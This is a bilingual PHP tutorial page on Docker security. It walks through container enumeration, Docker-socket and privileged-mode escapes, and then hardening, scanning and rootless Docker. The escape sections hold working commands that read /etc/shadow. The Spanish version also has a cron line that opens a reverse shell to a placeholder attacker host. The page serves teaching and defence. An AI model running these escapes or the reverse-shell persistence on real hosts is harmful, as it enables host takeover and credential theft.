<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'Docker: Seguridad y Hardening — CyberEscudo' : 'Docker: Security & Hardening — CyberEscudo';
$contentTitle = $lang==='es' ? 'Docker: Seguridad y Hardening de Contenedores' : 'Docker: Security & Container Hardening';
$contentDate  = '2024-08-20';
$contentDiff  = 'intermediate';
$contentTags  = ['Docker','Contenedores','Hardening','Misconfigurations','DevSecOps'];
ob_start(); if ($lang==='es'): ?>
<div class="prose">
  <p>Docker es omnipresente en infraestructuras modernas, pero una configuración incorrecta puede exponer el host o toda la red interna. Los contenedores <strong>no son máquinas virtuales completas</strong>; comparten el mismo kernel que el host subyacente. Este proyecto cubre los ataques más comunes y las medidas de hardening profundas.</p>

  <h2>1. Arquitectura de Aislamiento: Namespaces y Cgroups</h2>
  <p>La seguridad de Docker se basa en dos características del Kernel de Linux:</p>
  <ul>
      <li><strong>Namespaces:</strong> Proporcionan el aislamiento del espacio de trabajo. Cuando inicias un contenedor, Docker crea namespaces para procesos (PID), red (NET), montaje (MNT) y comunicación entre procesos (IPC). El contenedor solo "ve" lo que hay en su namespace.</li>
      <li><strong>Control Groups (Cgroups):</strong> Limitan y aíslan el uso de recursos (CPU, memoria, I/O de disco). Previenen que un contenedor comprometido lance un ataque de Denegación de Servicio (DoS) consumiendo toda la RAM del host.</li>
  </ul>

  <h2>2. Enumeración en un contenedor comprometido</h2>
  <p>Si consigues una reverse shell en un servidor, el primer paso es comprobar si estás "encerrado" en un contenedor.</p>
  <pre><code># Verificar si estamos en un contenedor:
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv           # Este archivo suele existir en la raíz

# Información del sistema y variables de entorno:
cat /etc/os-release
env | grep -iE "pass|secret|token|key|db_|api"  # Fuga clásica de credenciales

# Comprobar si el sistema de archivos es overlay (típico de contenedores):
mount | grep overlay

# Capacidades (Capabilities) del proceso actual:
cat /proc/self/status | grep CapEff
# Decodificar el hexadecimal resultante:
capsh --decode=0000000000003000</code></pre>

  <h2>3. El Ataque Crítico: Escape por Montaje del Socket de Docker</h2>
  <p>El socket de Docker (<code>/var/run/docker.sock</code>) es el archivo UNIX que el demonio de Docker usa para comunicarse con la CLI. Si un desarrollador monta este socket dentro de un contenedor (ej. para CI/CD como Jenkins o Portainer), está otorgando <strong>acceso root total al host</strong>.</p>
  <pre><code># 1. Comprobar si el socket está montado:
ls -la /var/run/docker.sock

# 2. Explotación — Crear un nuevo contenedor que monte la raíz del host (/) en /mnt:
# Al usar el socket, le estamos dando la orden al demonio del host, no al contenedor actual.
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh

# 3. ¡Estás en el host como root! Ahora puedes leer contraseñas o añadir persistencia:
cat /etc/shadow
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/atacante_ip/4444 0>&1'" >> /etc/crontab</code></pre>

  <!-- ─── SECCIÓN DEL RETO CTF 16 (ESPAÑOL) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> Simulador de Escape de Contenedor
      </h3>
      <p style="margin-bottom: 1.5rem;">Has comprometido una aplicación web y tienes una terminal interactiva (shell) dentro de su contenedor Docker. Tras investigar, descubres que el administrador ha montado imprudentemente <code>/var/run/docker.sock</code>. Demuestra tu habilidad escribiendo el comando exacto para escapar hacia el host.</p>
      <a href="/ctf/ctf-16.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ INICIAR RETO CTF 16
      </a>
  </div>

  <h2>4. Escape por Modo Privilegiado (--privileged)</h2>
  <p>Ejecutar un contenedor con el flag <code>--privileged</code> desactiva casi todos los mecanismos de seguridad de Docker. Permite al contenedor acceder a todos los dispositivos de hardware del host.</p>
  <pre><code># 1. Detectar modo privilegiado revisando los discos de hardware:
fdisk -l

# 2. Si ves el disco físico del host (ej. /dev/sda1), móntalo:
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# 3. Leer los ficheros del host:
cat /mnt/host/etc/shadow</code></pre>

  <h2>5. Hardening del Dockerfile (Desarrollo Seguro)</h2>
  <p>La seguridad empieza en el momento de crear la imagen. Reglas de oro:</p>
  <pre><code># ❌ MAL: Imagen pesada, usuario root por defecto, secretos cacheados
FROM ubuntu:latest
ENV DB_PASSWORD=supersecret123
RUN apt-get install -y curl
COPY . /app

# ✅ BIEN: Imagen minimalista, usuario sin privilegios, dependencias exactas
FROM python:3.12-alpine

# Crear usuario y grupo no privilegiado (ID 1000)
RUN addgroup -S appgroup && adduser -S appuser -G appgroup

WORKDIR /app
COPY --chown=appuser:appgroup requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY --chown=appuser:appgroup . .

# Cambiar del root al usuario creado
USER appuser
EXPOSE 8080
CMD ["python", "app.py"]</code></pre>

  <h2>6. Seguridad en Runtime y Seccomp / AppArmor</h2>
  <p>Al ejecutar un contenedor (<code>docker run</code>), debes aplicar el principio de menor privilegio.</p>
  <pre><code>docker run \
  --read-only \                  # 1. Evita que el atacante modifique archivos o instale malware
  --tmpfs /tmp \                 # 2. Permite escritura solo en memoria temporal
  --no-new-privileges \          # 3. Bloquea el uso de binarios SUID (escalada de privilegios)
  --cap-drop ALL \               # 4. Quita TODOS los permisos del kernel
  --cap-add NET_BIND_SERVICE \   # 5. Añade solo el permiso necesario (ej. abrir puerto 80)
  --memory 512m \                # 6. Evita DoS de memoria
  --cpus 0.5 \                   # 7. Evita DoS de CPU
  --security-opt seccomp=default.json \ # 8. Filtra llamadas al sistema opertivo (Syscalls)
  mi-imagen-segura:latest</code></pre>

  <h2>7. Escaneo de Vulnerabilidades y Firmas de Imágenes</h2>
  <p>Nunca confíes ciegamente en imágenes de Docker Hub. Las imágenes base contienen vulnerabilidades (CVEs) que heredarás.</p>
  <pre><code># Escanear imágenes localmente usando Trivy (Aqua Security):
trivy image nginx:latest
trivy image --severity HIGH,CRITICAL mi-app-interna:v1.2

# Activar Docker Content Trust (DCT) para exigir que las imágenes estén firmadas digitalmente:
export DOCKER_CONTENT_TRUST=1
docker pull ubuntu:latest # Fallará si la imagen no tiene firma validada</code></pre>

  <h2>8. Rootless Docker</h2>
  <p>La máxima recomendación de seguridad hoy en día. Consiste en ejecutar el demonio de Docker y los contenedores bajo un usuario sin privilegios del host (en lugar de root). Si ocurre una vulnerabilidad de escape, el atacante solo tendrá los permisos del usuario local de bajos privilegios, no será el `root` de la máquina.</p>

</div>

<?php else: ?>
<div class="prose">
  <p>Docker is ubiquitous in modern infrastructure, but a misconfigured container can expose the host or entire internal network. Containers <strong>are not full virtual machines</strong>; they share the same kernel as the underlying host. This project covers the most common attacks and deep hardening measures.</p>

  <h2>1. Isolation Architecture: Namespaces & Cgroups</h2>
  <ul>
      <li><strong>Namespaces:</strong> Provide workspace isolation (PID, NET, MNT, IPC). The container only "sees" its namespace.</li>
      <li><strong>Control Groups (Cgroups):</strong> Limit and isolate resource usage (CPU, memory), preventing DoS attacks.</li>
  </ul>

  <h2>2. Compromised Container Enumeration</h2>
  <pre><code># Check if we're inside a container:
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv
env | grep -iE "pass|secret|token|key" # Check for hardcoded secrets

# Check Capabilities:
cat /proc/self/status | grep CapEff</code></pre>

  <h2>3. The Critical Attack: Docker Socket Mount Escape</h2>
  <p>The Docker socket (<code>/var/run/docker.sock</code>) allows communication with the Docker daemon. If mounted inside a container, it grants <strong>full root access to the host</strong>.</p>
  <pre><code># 1. Check if socket is mounted:
ls -la /var/run/docker.sock

# 2. Exploit: Create a new container that mounts the host root (/) into /mnt:
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh

# 3. Read host files:
cat /etc/shadow</code></pre>

  <!-- ─── SECCIÓN DEL RETO CTF 16 (INGLÉS) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> Container Escape Simulator
      </h3>
      <p style="margin-bottom: 1.5rem;">You have compromised a web app and obtained an interactive shell inside its Docker container. After investigating, you discover the admin recklessly mounted <code>/var/run/docker.sock</code>. Prove your skills by writing the exact command to escape to the host.</p>
      <a href="/ctf/ctf-16.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ START CTF 16 CHALLENGE
      </a>
  </div>

  <h2>4. Privileged Mode Escape</h2>
  <pre><code># 1. Detect hardware disks:
fdisk -l

# 2. Mount host disk:
mkdir /mnt/host
mount /dev/sda1 /mnt/host
cat /mnt/host/etc/shadow</code></pre>

  <h2>5. Dockerfile Hardening</h2>
  <pre><code># GOOD: minimal image + non-root user
FROM python:3.12-alpine
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
WORKDIR /app
COPY --chown=appuser:appgroup requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
USER appuser
CMD ["python", "app.py"]</code></pre>

  <h2>6. Runtime Security & Seccomp</h2>
  <pre><code>docker run \
  --read-only \
  --no-new-privileges \
  --cap-drop ALL \
  --memory 512m \
  my-secure-image:latest</code></pre>

  <h2>7. Image Scanning & Rootless Mode</h2>
  <p>Always scan your images for CVEs using tools like <strong>Trivy</strong>. Furthermore, implementing <strong>Rootless Docker</strong> runs the daemon as a non-root user, mitigating the impact of any escape vulnerabilities.</p>
</div>
<?php endif; $contentBody=ob_get_clean(); require __DIR__.'/../templates/content-page.php';